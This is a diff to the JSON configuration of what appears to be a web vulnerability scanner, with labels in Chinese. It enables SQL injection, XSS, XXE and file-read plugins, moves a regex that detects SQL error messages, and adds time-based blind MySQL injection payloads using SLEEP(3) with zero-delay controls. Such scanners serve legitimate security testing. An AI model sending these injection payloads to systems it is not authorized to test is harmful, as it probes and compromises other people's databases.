@@ -1,8 +1,19 @@
 {
-  "config_version": 24,
-  "listen": "0.0.0.0:8888",
+  "config_version": 31,
+  "listen": "0.0.0.0:8889",
   "default_scheme": "https",
   "scan_mode": "standard",
+  "normal_plugins": [
+    "sqli",
+    "sqli_extended",
+    "file_upload",
+    "file_read",
+    "reflected_xss",
+    "unauthorized",
+    "xxe",
+    "sms_abuse",
+    "sensitive_data"
+  ],
   "timeout_seconds": 10,
   "max_concurrency": 8,
   "max_active_scans": 4,
@@ -1640,12 +1651,6 @@
           "confidence": "certain"
         },
         {
-          "name": "MyBatis/Spring 数据访问异常",
-          "pattern": "(?is)(org\\.apache\\.ibatis\\.exceptions\\.PersistenceException|MyBatisSystemException|BadSqlGrammarException|UncategorizedSQLException|DataIntegrityViolationException|#{3}\\s*Error (?:querying|updating) database|#{3}\\s*Cause:.{0,180}(?:SQLException|PSQLException|MySQLSyntaxErrorException)|The error may exist in .{0,180}(?:Mapper|\\.xml)|java\\.sql\\.(?:SQLSyntaxErrorException|SQLException)|JDBC.{0,100}(?:Exception|error))",
-          "severity": "high",
-          "confidence": "certain"
-        },
-        {
           "name": "存储过程/CallableStatement 异常",
           "pattern": "(?is)(CallableStatement.{0,120}(?:Exception|error)|callable statement.{0,120}(?:failed|error)|stored procedure.{0,120}(?:error|exception)|bad SQL grammar.{0,180}(?:call|CallableStatement))",
           "severity": "high",
@@ -1656,6 +1661,12 @@
           "pattern": "(?is)(SQL syntax.{0,120}|SQLSTATE\\[|bad SQL grammar|syntax error.{0,100}(?:SQL|query)|database error|query failed)",
           "severity": "high",
           "confidence": "firm"
+        },
+        {
+          "name": "MyBatis/Spring 数据访问异常",
+          "pattern": "(?is)(org\\.apache\\.ibatis\\.exceptions\\.PersistenceException|MyBatisSystemException|BadSqlGrammarException|UncategorizedSQLException|DataIntegrityViolationException|#{3}\\s*Error (?:querying|updating) database|#{3}\\s*Cause:.{0,180}(?:SQLException|PSQLException|MySQLSyntaxErrorException)|The error may exist in .{0,180}(?:Mapper|\\.xml)|java\\.sql\\.(?:SQLSyntaxErrorException|SQLException)|JDBC.{0,100}(?:Exception|error))",
+          "severity": "high",
+          "confidence": "certain"
         }
       ]
     },
@@ -2030,6 +2041,48 @@
           "group": "mysql-sleep-double-quote",
           "payload": "{{value}}\" AND SLEEP(2)=0-- ",
           "expected": "2"
+        },
+        {
+          "name": "MySQL 字符串 OR 零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-sleep-or-select-string",
+          "payload": "{{value}}' OR (SELECT SLEEP(0)) OR '731'='732",
+          "expected": "3"
+        },
+        {
+          "name": "MySQL 字符串 OR 3秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-sleep-or-select-string",
+          "payload": "{{value}}' OR (SELECT SLEEP(3)) OR '731'='731",
+          "expected": "3"
+        },
+        {
+          "name": "MySQL 字符串 AND SELECT 精确替换零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-sleep-and-select-exact-replace",
+          "payload": "' AND (SELECT SLEEP(0)) AND '1'='1",
+          "expected": "3"
+        },
+        {
+          "name": "MySQL 字符串 AND SELECT 精确替换3秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-sleep-and-select-exact-replace",
+          "payload": "' AND (SELECT SLEEP(3)) AND '1'='1",
+          "expected": "3"
+        },
+        {
+          "name": "MySQL 字符串 AND SELECT 模板闭合零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-sleep-and-select-template-close",
+          "payload": "{{value}}' AND (SELECT SLEEP(0)) AND '1'='1",
+          "expected": "3"
+        },
+        {
+          "name": "MySQL 字符串 AND SELECT 模板闭合3秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-sleep-and-select-template-close",
+          "payload": "{{value}}' AND (SELECT SLEEP(3)) AND '1'='1",
+          "expected": "3"
         }
       ],
       "patterns": [
